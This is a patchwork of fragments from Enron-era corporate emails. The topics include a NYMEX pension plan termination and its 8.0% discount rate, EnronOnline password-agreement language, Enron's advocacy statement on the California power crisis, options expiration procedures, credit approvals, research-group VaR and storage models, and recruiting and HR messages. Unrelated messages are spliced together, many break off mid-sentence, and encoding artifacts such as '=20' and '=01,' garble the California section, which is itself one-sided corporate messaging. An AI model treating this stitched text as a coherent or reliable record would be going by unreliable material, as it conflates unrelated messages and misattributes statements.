appropriate range of discount rates that should be used in terminating
the Plan should be between 7.8% and 8.1% and recommended using a
discount rate of 8.0%.  The third opinion recommended that the
appropriate range should be between 7.47% and 8.32% depending upon
various credit and other related actuarial issues.  Each of the
actuaries (including Deloitte & Touche) attended the Board meeting on
November 2, 2000 to present the rationale in support of their
respective recommendations and to answer any questions posed by
members of the Board.

The Board was advised by the Exchange's General Counsel, as well as by
two independent outside counsels, that in order to avoid even the
appearance of a conflict of interest, the Board should delegate
authority to choose an appropriate discount rate to a committee of
Directors who do not have any financial interest in the Plan.  The
Board passed a resolution in which it approved the recommendation of
its Counsel and delegated authority to select an appropriate discount
rate to a special committee (the Committee) composed of five Directors
who did not have an interest in the Plan.

After the Board formed the Committee, the members of the Committee,
the actuaries and the legal advisors left the room to discuss the
matter privately.  After thoroughly reviewing the matter, the
Committee returned and unanimously resolved and determined that the
appropriate discount rate that should be used in connection with the
termination of the Plan is 8.0%.

On October 23, 2000, the Exchange received a satisfactory Private
Letter Ruling from the IRS.  At its meeting on November 2, 2000, the
Board set a target closing date of November 15, 2000 for the
demutualization transaction.

Eligible participants of the Plan who are members at the time of the
closing of demutualization will receive service credit under the plan
through December 31, 2000.  All other rules regarding eligibility and
continuous service requirements will be applied according to the terms
and conditions set forth in the Plan.

Under the terms of the Plan, in the event of termination, Qualified
Participants (i.e. those participants with at least 15 years of
Continuous Service, as defined in the Plan) are entitled to a payout
equal to the net present value (NPV) of the scheduled ten-year benefit
payment that they would otherwise have received if the Plan had not
terminated, to the extent of the assets held in trust for this
purpose.  If there are remaining assets in trust after making payment
to the Qualified Participants, those remaining assets are to be
distributed to participants with Continuous Service (as defined in the
Plan) between 10 years and 14 years.  These 10 - 14 year participants
are entitled to the NPV of a fraction of the benefits they would have
received had the Plan remained in place until their normal retirement
age; the numerator of the fraction is the number of whole years of
Continuous Service and the denominator is 15.  If there are not
sufficient assets to pay each 10 -14 year participant their calculated
sums, then each 10 - 14 year participant will receive a pro rata
distribution.  These 10 - 14 year  participants must be members of
record at the time of the closing of demutualization in order to be
eligible to receive any distribution.

The Exchange is reviewing the census data and other pertinent
considerations with its actuaries, and all preliminary calculations
should be regarded as tentative and subject to change pending the
results of that review.  At this time, the Board believes that there
are sufficient assets to pay each Qualified Participant his or her
lump-sum benefit, based upon the approved a discount rate of 8.0%.  At
this time, it appears that after making payments to Qualified
Participants, the remaining assets will be sufficient to provide pro
rata benefits to 10 - 14 year participants.  10 - 14 year participants
can calculate their approximate distribution amount by multiplying the
NPV benefit of their corresponding age (see attached Schedule) by the
fraction of their whole years of service (10/15, 11/15, 12/15, 13/15,
or 14/15) by twenty-six (26%) (which at this time appears to be the
approximate  percentage of ""remaining assets"" available compared to
the total of all partial benefits otherwise calculated).

Qualified Participants who are already receiving benefits received
their last quarterly payment in October 2000.  Remaining obligations
to such participants will be valued in the same manner as other
Qualified Participants.

It is anticipated that actual payouts under the termination procedure
will be made in mid-January 2001.

As of December 31, 2000 it is expected that total Plan assets will be
approximately $33.5 million.  Regardless of the discount rate used,
100% of the assets of the Plan will be distributed.  Using a discount
rate of 8.0% the Qualified Participants will receive approximately $30
million or ninety percent (90%) of the total Plan assets and 10 - 14
year participants will receive the balance.

For illustrative purposes, and subject to the conditions noted above,
the attached Schedule represents an approximation of the anticipated
lump-sum payment to a Qualified Participant who has reached the age
indicated (but who has not yet begun receiving quarterly benefits) as
of December 31, 2000.

In the event that any member has any questions in connection with
termination of the Plan, please contact Chris Bowen at 299-2200 or
Suellen Galish at 299-2215.  Copies of  both the original and amended
Plans are available.

Separate But Related Matter

Contrary to erroneous information which has been disseminated by
others, neither the original Members Retention and Retirement Plan nor
the amended Plan provides for member votes on amendments.  In
accordance with Section 8 of the original Plan, in 1997 the amended
Plan was approved by a three fourths (3/4) vote of the Board.  Section
8 of both the original and amended Plan provides that ""the Board of
Directors of NYMEX may at anytime, amend or terminate this Plan in
whole or in part, upon the affirmative vote of three fourths (3/4) of
the entire Board"".  Section 8 of the Plan further specifically
describes how the Plan assets are to be distributed in the event of
termination.  Section 8(C) (1) states that the net present value of
lump sum termination payments shall be ""calculated by using the
applicable interest rate determined by the Board in its sole
discretion, in good faith, and such determination shall be conclusive
and binding on all parties"".  Section 11, entitled Authorization of
the Plan and which remains unchanged  from the original Plan, only
applies to the original authorization of the Plan which occurred in
1990.

Again, contrary to erroneous assertions that have been made, neither
the original Plan nor the amended Plan makes any reference to a specific 
discount rate that should be used in calculating NPV.  In fact, the estates 
of two deceased former members
(Mel Miller and Leon Grappel) that erroneously have been reported to
have received lump sum payments based upon a discount rate of 6.0%
actually received payments based upon discount rates of  7.4% (paid in
1992) and 7.2% (paid in 1993), respectively.

Inaccurate contentions and allegations diminish and undermine what we
are seeking to achieve as a global financial institution.

problems however - not because we are any better than anyone (in fact, I am 
not entirely confident that most of my fellow Canadians will understand, or 
have ever have understood, the ballot or voted for who they thought they were 
voting for) - but rather because of the political system which Jon's 
ancestors were so kind to bestow upon us, which I refer to as ""parliamentary 
dictatorship''. 

(Sorry Tana if you are a Democrat, but that is the independent middle of the 
road - yeah right - view of a Canadian observer.  Jon, I cannot, however, 
apologize for the political ruin which your system of Government has brought 
upon us, other to acknowledge that the problem my not be the system but 
rather our screwed up regionalization of your unified parliamentary system 
into 11 separate parliamentary systems - and I suppose that could be 
construed as an apology of sorts, except, for the record, I will never 
apologize to you for anything until you make a public, i.e. to Tana and me by

Denial of the Westheimer/San Felipe thing is intriguing - in fact (in keeping

place.  To paraphrase:  ""If the GMC Jimmy fits, you must admit!""

In any event, it seems while the Brits were frying fish, they passed along 
the election and democratic traditions from those Asian and African colonies 
to the American colonies, but that is only now being figured out.  It seems 
the Brits had the last laugh indeed.

Interesting US constitutional issue.  If the matter is resolved in Congress, 
I understand that the House of Representatives decides the President and as 
the House is narrowly Republican, they would likely choose Bush.  But the 
Senate then decides the Vice President, and as the Senate seems deadlocked, 
the decision then goes to the sitting Vice President - Gore - who could 
choose himself or Lieberman.  God I hope that happens.

I appreciate the patience on the Password issue.   I realize it has been a 
while since we first spoke about this point. 

I have reviewed the concern about hackers and Enron use of Passwords and the 
best we can do is insert language into the Password App. similar to that 
appearing in the attached document (which is the same type of language used 
in the ETA's).  It is intended only to cover the situation where Clickpaper 
personnel use the password or otherwise access the website, in an 
unauthorized manner, on behalf of a counterparty.  The language does not 
address the hacker situation as we place the burden in that situation upon 
the counterparty.

Finally, since the Password App. is a legal, electronic agreement, any 
amendments or modifications for a counterparty must come through my office or 
through Tana Jones ((x. 33399).  Accordingly, those counterparties who have 
raised the issue should call either one of us if further action is 
necessary.  We do not actually revise the form agreements, but do provide 
side letters indicating modifications to the form agreement.

Once again, please accept my apologizes for the delay.  Let me know if you 
should need anything further.

more information, please click below:




Each month now has two sheets, a summary sheet (eg Jan 01 Changes) and a 
detailed sheet (eg Jan 01).
Click below for more information:

The summary sheet can be used to view all changes after a certain date.  If 
you're aware of all changes up to, say, January 15th enter 01/16/2001 in cell 
C6 of the Summary Sheet and click the Sort button in cell H6.  All changes 
made to the report on or after January 16th will be listed automatically.
The Summary sheet may also be sorted for certain criteria - use the drop down 
arrows alongside the column headers to make your selection.

This sheet contains all the information you are used to seeing, but slightly 
reformatted.  Key points are: 
In the case of an Inactivation, the cause of the Inactivation (eg Merger) is 
listed in the Comments section
As with the previous format, 
all months' reports will be sent cumulatively throughout the year
the report will be sent out twice each month, on the 15th and at the end of 
the month.


It is our aim to publish the report in Livelink and to send out only the 
summary sheet and a URL for the detailed report each month.  This will save a 
lot of space in Lotus Notes and we hope it will streamline your monitoring 
process.

Shari had a counterparty point out to her that in our CSA Annex language

In addition to the supply and demand imbalance, there are two other related=

factors that led to the current crisis.  First, the state=01,s regulations=

e=20
most volatile interest rate environment imaginable.  Everything was fine=20
while the power surplus persisted, but when shortages ensued, every megawat=

Second, retail markets were not deregulated.  Regulated retail rates remain=

regulated retail rate.  They are now nearly bankrupt.

In short, California=01,s problems were caused by regulation, not deregulat=
ion. =20
Regulations prevented competitors from entering the market, prevented new=
=20
generation from being built, and prevented prudent hedging against volatile=
=20
spot prices.

At the time California was developing its restructuring plan, Enron warned=
=20
the state=01,s policy makers about these risks and proposed alternatives, w=
hich,=20
if adopted, would have averted the current crisis.

Enron=01,s Role

Many political leaders in the state have elected to fix blame rather than f=
ix=20
the problem.  Power sellers, including Enron, have been vilified by the=20
politicians and the media.  Here are the facts:

? Other than a small amount of wind power, Enron is not a generator in the=
=20
state of California.  Every megawatt we sold in California we bought in the=
=20
same market available to other California purchasers.  Because we are a=20
market maker, not a generator, we are not biased toward high prices.  We ar=
e=20
interested only in having a market that works so that we can package produc=
ts=20
for our customers.
? As a seller to end-use markets in the state, we provided protection from=
=20
the problems the states=01, utilities, and their customers, now face.  We=
=20
protected, and still protect, our customers from price volatility.

You may have read that EES recently elected to have the utilities supply=20
power directly to its customers in California instead of procuring power on=
=20
the open market.  Early reports mischaracterized this as a =01&turnback=018=
 of our=20
customers to the utilities.  Here are the facts:

? As a result of a variety of factors existing in the current California=20
market, it made more sense for EES to source power for its customers direct=
ly=20
from the utilities.  This decision reduced EES=01,s market price risk by=20
allowing EES to access lower utility rates.
? EES did not terminate any customer contracts, and our customers continue =
to=20
receive the financial benefits of their contract prices.
? EES is continuing to work with its California customers to provide them=
=20
with other energy-related products and services, including assistance in=20
reducing the demand for power, particularly at peak times.

Enron is currently proposing solutions to help California work out of its=
=20
crisis; Enron continues to sign up customers in the state; and Enron=20
continues to actively manage its risks and capture opportunities in Western=
=20
power markets.  Enron=01,s primary business is managing risk for our custom=
ers=20
with solutions customized to meet their needs.  There has never been more=
=20
demand for our products and services.

The Solution

The solution to California=01,s crisis is also straightforward.  In summary=
, the=20
state must increase supply, reduce demand, reduce reliance on the spot mark=
et=20
and shore up the financial stability of the state=01,s utilities.

Increasing Supply

California=01,s process for siting and permitting new generation is nothing=
=20
short of Byzantine.  Enron has built plants elsewhere in the country in les=
s=20
than a year.  In California, it often takes 5 to 7 years.  California simpl=
y=20
must streamline this process.  Ironically, while many of the regulations=20
generators must overcome are aimed at improving environmental quality, the=
=20
regulations are preventing new clean technology from coming online and=20
displacing current plants, which emit 40 times as much NOx.  California can=
=20
have abundant power and cleaner air by expediting the permitting of new=20
facilities.

Reducing Demand

Customers in California today have no incentive to reduce or shift demand. =
=20
They pay the same rate no matter what the market price is.  An open retail=
=20
market would trigger demand responses, which would balance supply and deman=
d=20
at lower prices than today.  California should fully open its retail market=
.

Reducing Reliance on the Spot Market

In a truly deregulated market, customers would protect themselves from=20
volatile spot prices by purchasing some of their requirements on a longer=
=20
term, fixed-price basis.  The state has instead left procurement in the han=
ds=20
of the utilities, which it has forced to buy exclusively in the spot market=
. =20
Opening the market at the retail level will give customers control over the=
ir=20
price risk.

Restoring the Financial Integrity of the State=01,s Institutions

The utilities in California are not paying their bills.  This has led to=20
greater uncertainty in the market, higher costs, and reduced flexibility to=
=20
arrive at lasting solutions.  California must permit its utilities to recov=
er=20
their costs so they can pay their bills and invest in the transmission and=
=20
distribution assets necessary to get power from where it is to where it is=
=20
needed.

Just as important as doing these things, the state must avoid policies that=
,=20
while politically attractive, do not fix the problem or even make matters=
=20
worse.  Price caps have been proposed.  They don=01,t work; have never work=
ed;=20
and they will not work here.  Price caps succeed only in creating shortages=
,=20
which then have to be allocated among competing users.  Imagine how=20
ineffectively the government would be in determining, for example, whether =
it=20
is better to make its limited power supplies available to the Imperial Vall=
ey=20
or Silicon Valley.  Price caps are a surefire way to make the current=20
shortage worse.

The state has also proposed to take over generation and transmission in=20
California.  There is no reason to believe, and every reason to doubt, that=
=20
the state will be more effective than free markets at investing in,=20
constructing, operating and maintaining assets.  This will also result in=
=20
California tax revenues being spent on power transmission and power=20
generation -- which the private sector can do -- instead of education, road=
s=20
and other public goods -- which the private sector cannot do.

As you are approached by people outside the company or are learning about t=

1551,"Attached is the FINAL Name Change/Merger report for March 2001.  Please note 
that the most recent overlays are on top because unlike the others, prior 
notification has not been given.  These were just done last night and this 
morning.  For the complete report, go to the bottom tab, ""March 2001"".

The shortname changes will be coordinated with ERMS IT today, Fri, 03/23/01.

Records will be inactivated on Mon, April 2, 2001.

FYI - On the Feb 2001 report, there were several PG&E entities that went 
through name changes to El Paso entities.  There were also 3 TECO 
conversions.  We did not have the documentation to support those changes, as 
noted on the report.  As of 03/22/01, all documentation for those changes are 
in hand.

Regarding the Coastal/El Paso merger, the documents that support name changes 
as a result of that merger, have been received.  If you are interested in 
more details regarding the remaining entities, they are attached below.

We have made a few changes to our Name Change/Merger Notification Report - it 
now has a new look and a couple of features we hope will assist you.  For 
more information, please click below:


Each month now has two sheets, a summary sheet (eg Jan 01 Changes) and a 
detailed sheet (eg Jan 01).
Click below for more information:

The summary sheet can be used to view all changes after a certain date.  If 
you're aware of all changes up to, say, January 15th enter 01/16/2001 in cell 
C6 of the Summary Sheet and click the Sort button in cell H6.  All changes 
made to the report on or after January 16th will be listed automatically.
The Summary sheet may also be sorted for certain criteria - use the drop down 
arrows alongside the column headers to make your selection.

This sheet contains all the information you are used to seeing, but slightly 
reformatted.  Key points are: 
In the case of an Inactivation, the cause of the Inactivation (eg Merger) is 
listed in the Comments section
As with the previous format, 
all months' reports will be sent cumulatively throughout the year
the report will be sent out twice each month, on the 15th and at the end of 
the month.


It is our aim to publish the report in Livelink and to send out only the 
summary sheet and a URL for the detailed report each month.  This will save a 
lot of space in Lotus Notes and we hope it will streamline your monitoring 
process.

We'd be very happy to receive any comments you may have.

________________________________________________________________

The expiration date for the May 2001 options contract for Gasoline-Crack 
(CGK1) and Heating Oil-Crack (CHK1) is Thursday, April 19, 2001.

GENERAL OPERATIONAL PROCEDURES

All Clearing Members and Qualified Floor Traders that carried an options

contract will be required to have a knowledgeable, duly authorized 
representative present at their normal work station promptly at 5:30 p.m. 
until released by the Exchange staff as specified below.  All adjustments 
and/or corrections, must be accompanied by relevant supporting documentation 
prior to being incorporated into expiration processing, in essence making the 
expiration processing an extension of the afternoon trade resolution 
procedures.  All input to the NYMEX Clearing Department will conclude no 
later than 30 minutes after floor representatives are released.

Exchange Clearing (299-2110), Floor Trade Correction (299-2068 and 299-2169) 
personnel, as well as a representative of the Floor Committee will be 
available to assist with the processing of notices of Exercise and

problems you may have.

system.  This input may be made at any time prior to 6:45 p.m.  Any PCS input 
via transmission for that contract series will be disregarded.

ALL POSITIONS ARE DEEMED FINAL
Upon completion of all PCS input, all positions will be deemed final.

E-Mail and by Fast Facts. This should occur within 1 hour of the last PCS

All Clearing Members are required to have an authorized representative(s) at 
their C21 workstations in preparation for any communication during the 
expiration process.

FAST FACTS
Clearing Members should call the Fast Facts information service 301-4871,

Deutsche Bank recently completed an ISDA with ENA.  On the heals of this 
agreement, they are now working on getting access to EOL for financial 
trading.  They originally provided five pages of comments to the ETA and 
Password Application, but it was clear from the comments they really did not 
understand how EOL was presented for use.  I provided a letter to them better 
explaining the way EOL works.  They have recently provided additional

Please approve the above mentioned for online trading for financial oil and 
gas in the U.S. only.    

We have a Master Swap contract with these guys, and they are an ESP.  
However, their exposure is well above the contractual threshold ($6.5MM 
credit line versus $12MM exposure) and we are not collateralized for the 
amount of exposure above the credit line.  So, as a result, we want to 
approve them for online trading, but we actually do not want them to be able 
to complete any transactions.  The counterparty has requested approval, and 
Fred Lagrasta has asked that we approve them so they can get online and see 
the stacks.  Credit does not want them to complete trades, so we need to set 
a very low credit line for online trading so when the counterparty attempts 
to trade (if they attempt to trade), is turned down.

If this is not possible, please ket me know so I can get back with Fred and 
the counterparty.

providing us the means to limit our interaction with others.

Which path will you choose?  Do you think we will get to choose, or will the 
choice be made for us by the primary users of the technology?  If we can 
choose, what will happen to those who take the second path?  What would those

I have had a few conversations over the past couple of days with Terry 
Brownrigg at Twister Gas Services, LLC and Todd Tharp with Sanguine, Ltd..  
We transacted with Twister last week and I had sent you a credit worksheet 
for the transaction.  Twister is a broker who transacts on behalf of small 
E&P companies, and in this case, the E&P agreed to post the L/C we quoted for 
the transaction.  After talking to Sara, it sounds like we are going to go 
ahead and send a confirmation to Twister for the deal and attach to the 
confirmation an assignment of the deal from Twister to Sanguine.  It is my 
understanding that both Terry and Todd will need to sign both the 
confirmation and the assignment, so I think we will need to carefully 
coordinate the steps through the Confirmation Desk (Sheetal Patel).

I have attached a worksheet for the transaction (Sanguine agreed to post 
$500K).  Please coordinate with Sara, Sheetal and me in getting this out.

I made a mistake on the language that we sent you on MAC.  On the last part

(1) The spreadoption, and other,  mappings in Risktrac are correct.  ie, 
E1S1B has both power(PPP) and gas(NBP) and the deltas/gammas tie out.  The 
LOLP and SMP mappings all tie out.
(2) However, the UK power in Risktrac has 25TWH more of Power.  This has 
something to do with the Enpower-Risktrac communication.
(3) UK-Gas positions tie out in aggregate (off by a single BcF)

For VaR discrepancies, other than positions, the following will contrbute
(1) In Risktrac power is mapped to R4 (Cinergy) while in the spreadsheet it 
is US-NG.

We finished the Version 2 of the simulation model which deals with the
open-close trading versus the continuous trading in the previous version.

I added the cummulative P/L as an output.   There are a few apparent trading
strategies from this model:

1) Higher bid/offer spread, more profit
2) More Daily # of trades, more profit
3) Smaller net open positions allowed, more profit

1) and 2) are obvious, but 3) is more interesting.  It means that we are 
better off
if we do not allowed net open positions at end of the day.  In a trending 
market,
this makes an intuitive sense, for example, in the case of bull market we are 
short as a market maker and we can avoid the loss at the higher openning price
by keeping zero or small net short positions.

I have attached the model with this mail, and I'll  be happy to discuss the 
model
in more details with you.

                  Our goal is to validate that the Enron Global Market book 
administrators are accurately using the ""spread option model"" as developed by 
the Research Group.    To determine this, we would like to provide you with 
the inputs for a particular deal (as provided by a Global Markets book 
administrator) and have you recalculate the deal value.   We will then 
compare your results to the values calculated by Global Markets.

 Two Koch deals have been chosen due to their substantial P/L effect.  I have 
attached the deal data in two forms: (1) the spread option model that Kara 
Boudreau, Book Administrator EGM, provided and (2) an excel spreadsheet that 
isolates the 2 deals.

 If there is anything more that we could provide, please don't hesitate to

I got your contact details from the  web site for power marketers. I have a 
strong interest in pursuing a career in  the energy industry?with a top 
energy company like?Enron, where my  abilities and qualifications can be 
fully applied for our mutual benefit.  

I am graduating in May with an  MBA?degree with concentrations in finance and 
information systems. This  summer I worked?as an intern with Structuring and 
Analytics group of Ameren  Energy.?This internship?has been especially  
challenging and has enhanced my professional competencies. While there, I  
was afforded the opportunity to?develop a forward view  model?for?off-
peak?electricity price forecasting and analyze the  data sets of a 
fundamental?model to create forward price curves. Both  projects added value 
to the company and provided me with first-hand experience  in the area of 
energy trading and marketing as well as modeling  techniques.

In addition, I have an undergraduate degree in Mechanical  Engineering and 
two years' experience in power generating. With my work  experience in energy 
finance and exceptional academic and professional  achievements, along with 
my exemplary leadership and management potential and  outstanding analytical,

Just a thought. Changes in the portfolio values may combine both the changes 
of prices and positions.
This happens if one tracks changes in the value of our historical gas 
portfolio. A big jump in
the volumetric position from day to day, combined with a moderate price 
movement may produce an
observation that looks artificially big.

If the volumetric position was frozen, it's just a scaling factor and there 
should be 
no discrepancy between your numbers. Of course, the correct approach
is to separate the price process from the position changes.

have an adequate number of interviewers and will not need you to sacrifice 
your Saturday.  However, as last minute changes occur in the interview 
schedule we may have to contact you for back up.    

Although we are in good shape so far for Saturday, our off-cycle recruiting 
department  is looking for interview volunteers for the following dates:

Thursday, November 9th from 9:00 a.m - 12:00 p.m
Thursday, November 16th from 9:00 a.m. - 12:00 p.m.
Thursday, December 7th from 9:00 a.m. -1:00 p.m.

Over 50 candidates will be interviewing over these 3 days.  The candidates 
will be a combination of Associates and Analysts representing schools such as 
Princeton, Harvard, University of North Carolina, Notre Dame, University of 
Illinois, Emory and many others.  Each candidate will have 4 interviews.  
Pending the outcome of their interviews we will invite them to stay and 
attend Super Saturday that weekend.  If for some reason we decide not to 
further pursue the candidate, we will fly them home that Friday morning.

We are asking Enron employees manager level or higher  to volunteer at least 
ONE HOUR to interview candidates (you will see two candidates in that time).  
If you can volunteer for more than an hour or for more than just one of the 
stated dates, that would be great!  Your help is needed!  Please contact

Thanks - based on a ""speed read"" it would appear that SRM sits neatly in the 
volumetric part of your framework. Regarding systems I am keen to preserve 
the work Kevin has already done and I suspect we can eventually use the

we require.

To be honest, I feel a good deal more comfortable that there is already a

A Measurement Framework for Bank Liquidity  Risk

Raymond Cote
Vice  President, FinRad Inc.

Raymond Cote is Vice President, Financial  Engineering at FinRad Inc., a 
Montreal-based consulting firm offering financial  management solutions that 
combine advisory and systems development services to  &corporations and 
financial institutions.

Abstract:

Liquidity  risk, as opposed to credit and market risks, has received little 
attention in  professional or academic journals. We argue that analyzing bank 
liquidity risk  can be viewed as a variation of credit risk analysis. After 
introducing some  concepts and definitions, the presentation defines a 
framework allowing to  measure a bank's structural liquidity risk. It then 
shows that combining the  framework with modern credit risk measurement tools 
leads to a liquidity risk  VAR measure. The presentation then offers 
concluding comments on the integration  of the liquidity risk measurement 
framework within enterprise-wide risk  management.

Last night, I tested our new system for real-time surveillance and messaging 
of the weather, and it delivers the data to desktops throughout the building 
more than 6 1/2 minutes before the National Weather Service updates their 
webpages. Our current technology was web-scraping these pages via ftp, then 
parsing into a database. The impact of these 6 1/2 minutes for the hourly 
power traders is enormous- the weather stations upload their data around 53 
minutes after the hour, and we can now receive them within 2 minutes later. 
We can now re-estimate our nonlinear stack model before the top of the hour, 
when hourly power trading begins. Otherwise, we would not have model results 
until around 15 minutes after the hour. Notably, hourly power trading is, for 
all intents and purposes, concluded by then (they trade for 10-15 minutes and 
manage the scheduling for the next 30 or so miutes). So, effectively, we may 
now be one *hour* ahead of where we were just a few days ago, in terms of 
information. People are very excited up here, from the CTO on down- thanks

The updated probabilities are attached.  The probability of reaching any Fx 
times RAB multiple are the same as the original analysis.  The probabilities 
of reaching a given stock price are lower than the original analysis in both 
the optimistic and pessimistic cases because the debt levels are higher, and 
hence the stock value is lower for any Fx-RAB value.

We are very close to generating factors for all primary curves.  Jin almost 
get it done.

But we are still waiting on the expiration dates for those London curves.  If 
anyone can help, please help.

Also, we have some curves that don't have Futures.  How to decide these 
curves's expiration dates?

Matthew Adams helped us deciding many curves expiration rules.  But there are 
still many primary curves that don't have expiration dates.

If no expiration dates, then there will be no factor loadings.  Whoever wants 
to generate factor loadings then give us the expiration dates first! :)

2002,"Hey Vince,

Thanks for your reply.  I'll see what becomes of the session and keep you
informed.  As to the paper, Tim Crack and I have a revised version of the
paper I gave you.  We have since found out that by using certainty
equivalence, our model is more robust.  For example, if one has an asset
pricing model that incorporates mean, variance, and skewness (Harvey and
Siddique, JF June, 2000) and a binomial model that incorporates mean,
variance, and skewness (Johnson, Paulukiewicz, and Mehta, RQFA, 1997), our
model allows you to price options under the real world measure.  The
benefit is that one can take all of the model parameters from historical
data that is non-risk neutralized.
   From a pricing perspective, there isn't a tremendous benefit in a
mean-variance world (variance stays the same in risk neutral or risky
measure).  However,in the mean-variance-skewness world, there is a benefit
because we do not believe (although we're still hunting down an appropriate
cite) skewness is the same under risk-neutral and risky measure.  Given we
can only measure the skewness in our risky world, our model becomes much
more significant.
   I would certainly appreciate comments on the version of the paper you
have and would also pass on the new version of the paper if you would like
to see it.

I am also fitting AGA to an ARIMAX model.  As discussed, I need weighted

data for east, west and production areas.   I would appreciate if you could 
provide that data.
 After that, I could add forward price curve as explainatory variables.

2022,"Vlady, I enclosed the file with 2 backtesting plots (you saw them before).

The following table shows what was the percentage of the days when PnL fell 
below VAR95, VAR90, VAR85. 
These results are based on the real NG forward prices from 1/1/99 to 6/7/00 
for 2 different portfolios:
-Portfolio 1 contained the positions equal to NG-PRICE-PRC portfolio 
positions on 6/6/00, 
-Portfolio 2 consists of the positions equal to STORAGE-PRC positions on 
5/25/00.

_____________________________________________________________________
Portfolio 1
     VAR95  VAR90  VAR85  
Implied Vols    2.93  4.11  5.57
Historical vols with Decay=1  7.62  12.02  15.54
Historical vols withDecay=0.97  6.75  12.02  15.54
Historical vols withDecay=0.94  6.45  12.02  15.54
_____________________________________________________________________

     VAR95  VAR90  VAR85  
Implied Vols    4.1  6.74  9.97
Historical vols with Decay=1  7.04  11.14  15.84

Historical vols withDecay=0.94  7.04  11.14  15.84
____________________________________________________________________
This shows that when we have more observations (columns corresponding to 
VAR90 and VAR85)
compared to the column corresponding to VAR95 the frequency of Curve Shift 
being lower than VAR
becomes closer to the theoretical value (5%, 10% and 15%). The numbers in the 
column ""VAR85"" are 
very close to 15%. This is the argument in favor of using historical vols. 
And also the results do not depend on the decay factor in this experiment.

Also notice: the numbers in column ""VAR95"" are higher than 5% and this is an 
indication of fat tails.

Let me know if you have any questions.

Got your message.  

As we discussed, the best way to breakdown the big correlation matrix between 
different location indices is through ""cluster analysis"".  The idea is to 
select major
hubs and the ""satellite"" markets.  By establish the correlation between the 
hubs
and correlation between the satellites and the hubs, the big matrix can be 
significantly
reduced.    Then the traders only need to input the correlations between the 
hubs.

This technique has been applied in our Value at Risk system.  You may talk to 
Tanya to find out the details.

cover the full range of interests represented by this group.  Researchers
should focus on the implications of their analysis for designing demand

2053,"Hi Vince,

HR is working on a mid-year salary review for London people that have a 
noticeable gap between their compensation at Enron and what we would have to 
pay in the market for a replacement.  They highlighted Steve as someone with 
a potential gap - particularly in light of what we're seeing in our quant 
recruiting effort for credit trading and research.

I'd like your opinion on the best way to make sure we keep Steve happy and 
keep him at Enron.  There are several things I see we can do:

1)  Give him a mid-year pay increase to move him closer to market.  I'm not 
sure this is the best way to go, especially if we only offer him a token 
salary increase.

2)  Offer him more responsibility:  What are your thoughts on timing for 
making Steve the official head of the London research team?  With my move to 
EBS, should we accelerate this?  I think this is good way to keep him happy 
and motivated, and then follow up with a more meaningful salary review at 
year-end (as part of the regular process) that takes into account his greater 
responsibility.

3)  We have some people that we're trying to get under long-term (3-yr) 
contract with a 12-month notice clause.  Obviously anyone signing one of 
these will want significant up-front compensation for being handcuffed.  
We've not had a lot of success with these here in London, and I would prefer 
to keep Steve happy so he wants to stay with Enron rather than contractually 
binding him to the job.

I'd value your thoughts on this.

Thanks,

I would like to make myself available for some meetings at the Oslo office 
during my visit on Friday pm, Monday and Tuesday.  I believe Bjarne will be 
available on Tuesday, if not Monday, and so would like to arrange the Trading 
and Origination meetings for Tuesday (so that he can attend) and maybe go 
through the EnergyDesk issues on Monday.  I will also give a presentation, 
probably on Monday.

TRADING: OPTIONS & VOLATILITY CURVES
It would be useful to meet with the traders along with Bjarne's team to help 
us improve our understanding of the valuation/hedging issues encountered in 
trading options (both European and Asian).  I hope to discuss the vol curves 
and will bring the example of the recent work done for the UK electricity 
desk where a monthly volatility curve generator and initial half-hourly 
forward volatility curve have been developed.

ORIGINATION:
Any issues arising in complex deals (e.g. dry reservoir, user-time contracts) 
etc. perhaps with Didrik.

ENERGYDESK.COM
To support the on-going effort to ensure the accuracy of the EnergyDesk.com 
systems, I hope to help James Stephen nail-down the reasons for some of the 
discrepancies between the EnergyDesk.com valuation and the Oslo book (for 
this I hope to meet with Trond).

EXOTIC OPTIONS:
If everything runs smoothly, I plan to roll-out the new Asian model which 
should also help us in improving our electricity volatility curve.

I will be in the Oslo office from Friday afternoon, and available all day 
Monday and Tuesday.  I will be staying at the Grand Hotel and probably

I am writing you at this time to inquire as to the potential of renewing my
internship at Enron for the Summer of 2000.

While the date of my request is later than I would have wished, the reason
is that I had originally planned to go back to Turkey this summer and get
my mandatory military duty done. However, I now realize I can put it off to
a further date. That left me wondering if you believe there is a project
that I can get involved in this summer and be useful. If that were the
case, I would be more than happy to postpone my military duty and spend the
summer with the research group. I discussed this with Dr. Ronn, and he is
very supportive of this idea.

I have modified the storage valuation model to adopt the deal of synthetic 
storage.
For the 11 month synthetic storage deal proposed by the
Peoples Energy , the model gives $0.51/mmBtu.    Thus the People's bid for  
$0.49/mmBtu is in line with the model.

I would be happy to discuss the details for everyone who is interested.   In 
essence, the model allows optimal  injections
during March-May and optimal withdraws dring Dec-Jan.  The model also 
encourages the storage to be full at the 
end of May, and empty at the end of Jan.

Attached is a copy of the SDDP Methodology manual, written by the 
developers.  The model was developed by Mario Pereira, who is the proprietor 
of PSRI (Power Systems Research Inc) in Rio de Janeiro.   Their web site is: 
www.psr-inc.com where you can find more information about the company and 
contact details.  Mario and most of the staff speak English, so phone calls 
are possible.  

Development of SDDP was originally done on a World Bank contract to compare 
the benefits of new generation and transmission system interconnections in 
Central America.  It has since found much wider application.  The code runs 
on a PC, and is licensed to a number of consultants, power companies, etc.  
While I was with ECNZ in Wellington, New Zealand, we purchased a copy around 
1994.

The model works with weekly or monthly time steps, with a time horizon of 
from 1 to 10 years, for mid to long range planning of hydro thermal power 
systems.  It represents loads in each period as from one to five load blocks, 
so it is not a chronological model.  This type of model can not handle 
thermal plant ramp rates and similar chronological system constraints.  I'm 
not sure how important that would be to you.  The optimization phase of the 
model takes into account hydrological uncertainty using a form of stochastic 
dynamic programming with sampling.  This phase sets up a function for water 
value in each large reservoir in the system.  The simulation phase uses a 
number of hydrological outcomes to collect statistics on how the system would 
operate.  The water values can be used with the short term optimization mode 
of SDDP or in some other more detailed short term optimization model.

Most constraints found in hydro systems can be modelled.  Many transmission 
constraints can be modelled.  A DC load flow option can be used to determine 
bus nodal prices.

A Visual Basic user interface is provided which reads and writes text files.

If you'd like to know more about SDDP, you could call me here in Houston.

2138,"To further the process of reaching the stated objectives of increasing Enron America's Velocity of Capital and associated Return on Invested Capital, we have decided to create a Capital Book. The Capital Book will have no profit target associated with it and will be managed by Joe Deffner. The purpose of creating this book is to ensure that all transactions within Enron Americas, with any form of capital requirement, are structured correctly and are allocated the appropriate cost of capital charge. 

